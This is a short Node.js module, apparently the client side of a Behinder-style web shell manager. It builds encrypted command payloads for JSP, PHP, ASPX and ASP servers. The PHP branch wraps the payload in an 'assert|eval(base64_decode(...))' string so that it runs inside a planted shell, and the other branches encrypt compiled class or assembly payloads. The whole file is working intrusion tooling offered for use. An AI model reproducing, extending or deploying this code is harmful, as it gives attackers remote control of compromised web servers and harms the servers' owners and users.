const crypto = require("./crypto");
const payload = require("./params");

function GetData(key, className, params, types, encryptType) {
    let bincls;
    if (types === "jsp") {
        bincls = payload.getParamedClass(className, params);
        bincls = Buffer.from(bincls, 'base64');
        return crypto.encryptForJava(bincls, key)
    } else if (types === 'php') {
        bincls = payload.getParamedPhp(className, params)
        bincls = Buffer.from(bincls).toString('base64');
        bincls = ("lasjfadfas.assert|eval(base64_decode('" + (bincls) + "'));")
        let encrypedBincls = crypto.encryptForPhp(bincls, key, encryptType)
        // console.log(encrypedBincls)
        return encrypedBincls
    } else if (types === 'aspx') {
        bincls = payload.getParamedAssembly(className, params)
        //if (extraData != null) {
        //	bincls = CipherUtils.mergeByteArray(bincls, extraData);
        //}
        let encrypedBincls = crypto.encryptForCSharp(bincls, key)

        console.log(Buffer.from(encrypedBincls, 'base64'))
        return Buffer.from(encrypedBincls, 'base64')
    } else if (types === 'asp') {
        bincls = payload.getParamedAsp(className, params)
        //if (extraData != null) {
        //	bincls = CipherUtils.mergeByteArray(bincls, extraData);
        //}
        let xxx = Buffer.from(bincls).toString('hex')
        let yyy = Buffer.from(xxx, 'hex')

        return crypto.decryptForAsp(yyy, key)
    }
}

module.exports = GetData
